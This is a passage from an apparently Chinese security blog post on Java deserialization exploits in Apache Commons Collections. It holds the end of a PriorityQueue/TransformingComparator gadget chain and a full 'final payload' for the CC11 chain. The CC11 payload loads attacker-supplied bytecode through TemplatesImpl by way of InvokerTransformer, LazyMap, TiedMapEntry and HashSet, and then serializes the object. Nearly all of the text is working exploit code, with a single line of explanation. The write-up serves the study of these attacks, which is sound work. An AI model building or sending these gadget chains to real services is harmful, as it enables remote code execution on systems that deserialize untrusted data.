        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>

<span class="c1">//        Field tfactory = tc.getDeclaredField("_tfactory");</span>
<span class="c1">//        tfactory.setAccessible(true);</span>
<span class="c1">//        tfactory.set(templates,new TransformerFactoryImpl());</span>


        <span class="n">InvokerTransformer</span> <span class="n">newTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{});</span>
        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>

        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="n">transformingComparator</span><span class="o">);</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">transformingComparator</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">transformer</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"transformer"</span><span class="o">);</span>
        <span class="n">transformer</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">transformer</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">,</span><span class="n">newTransformer</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<h5 data-content="1" id="26ff2848c7977a88671654e15f71b351">流程分析</h5>
<p>其实也是换汤不换药就是拿前两个cc的前部分和后半部分进行拼接的。</p>
<h4 data-content="1" id="17c68ddc5a2fd9cf9bfec270e2996a11">CC11链</h4>
<h5 data-content="1" id="c9bce28e811ca921f3b674f48766438e">最终payload</h5>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
<span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
<span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
<span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>




<span class="n">InvokerTransformer</span> <span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"asdfasdfasdf"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
<span class="n">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">LazyMap</span> <span class="n">map</span> <span class="o">=</span> <span class="o">(</span><span class="n">LazyMap</span><span class="o">)</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">transformer</span><span class="o">);</span>
<span class="n">TiedMapEntry</span> <span class="n">tiedmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">templates</span><span class="o">);</span>


<span class="n">HashSet</span> <span class="n">hashset</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="n">hashset</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"foo"</span><span class="o">);</span>
<span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="k">try</span> <span class="o">{</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">HashSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"map"</span><span class="o">);</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">HashSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"backingMap"</span><span class="o">);</span>
<span class="o">}</span>
<span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">HashMap</span> <span class="n">hashset_map</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashset</span><span class="o">);</span>

<span class="n">Field</span> <span class="n">f2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="k">try</span> <span class="o">{</span>
    <span class="n">f2</span> <span class="o">=</span> <span class="n">HashMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"table"</span><span class="o">);</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">f2</span> <span class="o">=</span> <span class="n">HashMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"elementData"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">f2</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">Object</span><span class="o">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span><span class="n">f2</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">hashset_map</span><span class="o">);</span>

<span class="n">Object</span> <span class="n">node</span> <span class="o">=</span> <span class="n">array</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
<span class="k">if</span><span class="o">(</span><span class="n">node</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
    <span class="n">node</span> <span class="o">=</span> <span class="n">array</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
<span class="o">}</span>
<span class="n">Field</span> <span class="n">keyField</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="k">try</span><span class="o">{</span>
    <span class="n">keyField</span> <span class="o">=</span> <span class="n">node</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"key"</span><span class="o">);</span>
<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
    <span class="n">keyField</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.MapEntry"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"key"</span><span class="o">);</span>
<span class="o">}</span>
<span class="n">keyField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">keyField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">node</span><span class="o">,</span><span class="n">tiedmap</span><span class="o">);</span>

<span class="n">Field</span> <span class="n">f3</span> <span class="o">=</span> <span class="n">transformer</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"iMethodName"</span><span class="o">);</span>
<span class="n">f3</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">f3</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformer</span><span class="o">,</span><span class="s">"newTransformer"</span><span class="o">);</span>

<span class="n">serialize</span><span class="o">(</span><span class="n">hashset</span><span class="o">);</span>
<span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192725-9784bbaa-14dd-1.png"/></p>
</div>
</div>